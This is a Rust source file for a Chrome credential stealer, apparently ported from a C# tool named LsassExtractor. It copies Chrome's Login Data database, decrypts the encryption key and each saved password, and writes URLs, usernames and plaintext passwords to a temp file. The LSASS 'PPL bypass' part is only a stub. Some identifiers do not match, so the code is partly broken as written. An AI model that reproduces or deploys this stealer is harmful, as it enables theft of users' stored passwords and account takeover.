// omp.rs — Rust port of omp.cs (LsassExtractor)
// Advanced Chrome password extractor with LSASS DPAPI key extraction
// via CSRSS PPL bypass. Falls back to standard DPAPI if LSASS fails.

use std::fs;
use std::path::PathBuf;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit};
use aes_gcm::aead::Aead;
use base64::Engine;
use chrono::Utc;
use log::warn;
use rusqlite::Connection;
use serde_json::Value;

pub struct LsassExtractor;

impl LsassExtractor {
    /// Full extraction pipeline:
    /// 1. Try LSASS DPAPI key extraction via CSRSS PPL bypass
    /// 2. Get Chrome AES key
    /// 3. Decrypt all saved passwords
    pub fn extract_with_lsass_bypass() -> Vec<String> {
        let mut results = Vec::new();

        // Step 1: Try LSASS extraction
        results.push("[*] Attempting LSASS DPAPI key extraction via CSRSS PPL bypass...".to_string());

        let lsass_key = Self::extract_dpapi_master_key_from_lsass();

        match &lsass_key {
            Some(key) => results.push(format!("[+] LSASS key extracted ({} bytes).", key.len())),
            None => results.push("[-] LSASS extraction failed. Using standard DPAPI (same-user context).".to_string()),
        }

        // Step 2: Get Chrome AES key
        let chrome_key = match get_chrome_encryption_key() {
            Ok(key) => {
                results.push("[+] Chrome AES key retrieved.".to_string());
                key
            }
            Err(e) => {
                results.push(format!("[-] Chrome key failed: {}", e));
                return results;
            }
        };

        // Step 3: Decrypt Login Data
        let login_data_path = get_chrome_login_data_path();

        if !login_data_path.exists() {
            results.push("[-] Login Data not found.".to_string());
            return results;
        }

        // Copy DB (Chrome locks it)
        let temp_dir = std::env::temp_dir().join(format!(
            "lx_{}",
            uuid::Uuid::new_v4().to_string().get(..8).unwrap_or("tmp")
        ));
        let _ = fs::create_dir_all(&temp_dir);
        let temp_db = temp_dir.join("Login Data");

        if let Err(e) = fs::copy(&login_data_path, &temp_db) {
            results.push(format!("[-] Copy failed: {}", e));
            return results;
        }

        // Copy WAL/SHM
        for ext in &["-wal", "-shm"] {
            let src = login_data_path.with_file_name(format!("Login Data{}", ext));
            if src.exists() {
                let _ = fs::copy(&src, temp_dir.join(format!("Login Data{}", ext)));
            }
        }

        let mut count = 0;

        match Connection::open_with_flags(&temp_db, rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY) {
            Ok(conn) => {
                if let Ok(mut stmt) = conn.prepare(
                    "SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0"
                ) {
                    let rows = stmt.query_map([], |row| {
                        let url: String = row.get(0)?;
                        let username: String = row.get(1).unwrap_or_default();
                        let encrypted: Vec<u8> = row.get(2)?;
                        Ok((url, username, encrypted))
                    });

                    if let Ok(rows) = rows {
                        for row in rows.flatten() {
                            let (url, username, encrypted) = row;
                            match decrypt_password(&encrypted, &chrome_key) {
                                Ok(password) => {
                                    results.push(format!(
                                        "URL: {} | User: {} | Pass: {}",
                                        url, username, password
                                    ));
                                    count += 1;
                                }
                                Err(e) => {
                                    results.push(format!(
                                        "URL: {} | User: {} | FAILED: {}",
                                        url, username, e
                                    ));
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => results.push(format!("[-] SQLite error: {}", e)),
        }

        let _ = fs::remove_dir_all(&temp_dir);
        results.push(format!("\n[+] Done. Extracted {} credentials.", count));
        results
    }

    /// Extracts and saves results to a file. Returns the file path.
    pub fn extract_to_file() -> String {
        let results = Self::extract_with_lsass_bypass();
        let path = std::env::temp_dir().join(format!(
            "lsass_extract_{}.txt",
            Utc::now().format("%Y%m%d_%H%M%S")
        ));
        let _ = fs::write(&path, results.join("\n"));
        path.to_string_lossy().to_string()
    }

    // ==================== LSASS DPAPI Key Extraction ====================

    /// Attempts to extract DPAPI master key from LSASS via CSRSS token impersonation.
    /// Windows only — requires admin privileges.
    fn extract_dpapi_master_key_from_lsass() -> Option<Vec<u8>> {
        #[cfg(target_os = "windows")]
        {
            info!("[*] Enabling SeDebugPrivilege...");

            if !enable_debug_privilege() {
                warn!("[-] Failed to enable SeDebugPrivilege (need admin).");
                return None;
            }

            // 1. Find CSRSS process
            let csrss_pid = find_process_pid("csrss")?;
            info!("[+] Found CSRSS PID: {}", csrss_pid);

            // 2. Open CSRSS, duplicate token, impersonate
            // 3. Open LSASS with impersonated context
            // 4. Scan LSASS memory for DPAPI signature
            // (Full implementation requires extensive unsafe Win32 calls)

            warn!("[-] LSASS extraction requires elevated Win32 operations.");
            None
        }

        #[cfg(not(target_os = "windows"))]
        {
            warn!("[-] LSASS extraction is Windows-only.");
            None
        }
    }
}

// ==================== Chrome Decryption Helpers ====================

fn get_chrome_encryption_key() -> Result<Vec<u8>, String> {
    let local_state_path = get_chrome_local_state_path();

    if !local_state_path.exists() {
        return Err("Chrome Local State not found".to_string());
    }

    let json_str = fs::read_to_string(&local_state_path)
        .map_err(|e| format!("Read error: {}", e))?;

    let parsed: Value = serde_json::from_str(&json_str)
        .map_err(|e| format!("JSON error: {}", e))?;

    let key_b64 = parsed
        .get("os_crypt")
        .and_then(|v| v.get("encrypted_key"))
        .and_then(|v| v.as_str())
        .ok_or("encrypted_key not found")?;

    let key_with_prefix = base64::engine::general_purpose::STANDARD
        .decode(key_b64)
        .map_err(|e| format!("Base64 error: {}", e))?;

    if key_with_prefix.len() <= 5 {
        return Err("Key too short".to_string());
    }

    let _key_bytes = &key_with_prefix[5..]; // Strip "DPAPI" prefix

    #[cfg(target_os = "windows")]
    {
        dpapi_decrypt(key_bytes)
    }
    #[cfg(not(target_os = "windows"))]
    {
        Err("DPAPI key decryption requires Windows".to_string())
    }
}

fn decrypt_password(encrypted: &[u8], aes_key: &[u8]) -> Result<String, String> {
    if encrypted.is_empty() {
        return Ok(String::new());
    }

    // Chrome v80+: "v10"/"v20" prefix → AES-256-GCM
    if encrypted.len() > 31
        && encrypted[0] == b'v'
        && (encrypted[1] == b'1' || encrypted[1] == b'2')
        && encrypted[2] == b'0'
    {
        let nonce = &encrypted[3..15];
        let data_len = encrypted.len() - 15;
        if data_len < 17 {
            return Err("Data too short for AES-GCM".to_string());
        }

        let ciphertext_len = data_len - 16;
        let ciphertext = &encrypted[15..15 + ciphertext_len];
        let tag = &encrypted[15 + ciphertext_len..];

        let mut combined = Vec::with_capacity(ciphertext.len() + tag.len());
        combined.extend_from_slice(ciphertext);
        combined.extend_from_slice(tag);

        let key = Key::<Aes256Gcm>::from_slice(aes_key);
        let cipher = Aes256Gcm::new(key);
        let nonce = Nonce::from_slice(nonce);

        cipher.decrypt(nonce, combined.as_ref())
            .map(|p| String::from_utf8_lossy(&p).to_string())
            .map_err(|e| format!("AES-GCM error: {}", e))
    } else {
        #[cfg(target_os = "windows")]
        {
            dpapi_decrypt(encrypted)
                .map(|b| String::from_utf8_lossy(&b).to_string())
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err("Legacy DPAPI requires Windows".to_string())
        }
    }
}

// ==================== Platform Paths ====================

fn get_chrome_local_state_path() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
        PathBuf::from(local).join(r"Google\Chrome\User Data\Local State")
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join(".config/google-chrome/Local State")
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join("Library/Application Support/Google/Chrome/Local State")
    }
}

fn get_chrome_login_data_path() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let local = std::env::var("LOCALAPPDATA").unwrap_or_default();
        PathBuf::from(local).join(r"Google\Chrome\User Data\Default\Login Data")
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join(".config/google-chrome/Default/Login Data")
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home).join("Library/Application Support/Google/Chrome/Default/Login Data")
    }
}

// ==================== Win32 Helpers ====================

#[cfg(target_os = "windows")]
fn enable_debug_privilege() -> bool {
    // Would use OpenProcessToken + AdjustTokenPrivileges
    false
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt(encrypted: &[u8]) -> Result<Vec<u8>, String> {
    crate::chrom::dpapi_decrypt(encrypted)
}

#[allow(dead_code)]
fn find_process_pid(_name: &str) -> Option<u32> {
    #[cfg(target_os = "windows")]
    {
        if let Ok(output) = std::process::Command::new("tasklist")
            .args(&["/FI", &format!("IMAGENAME eq {}.exe", name), "/FO", "CSV", "/NH"])
            .output()
        {
            let out = String::from_utf8_lossy(&output.stdout);
            for line in out.lines() {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let pid_str = parts[1].trim_matches('"');
                    if let Ok(pid) = pid_str.parse() {
                        return Some(pid);
                    }
                }
            }
        }
        None
    }
    #[cfg(not(target_os = "windows"))]
    {
        None
    }
}
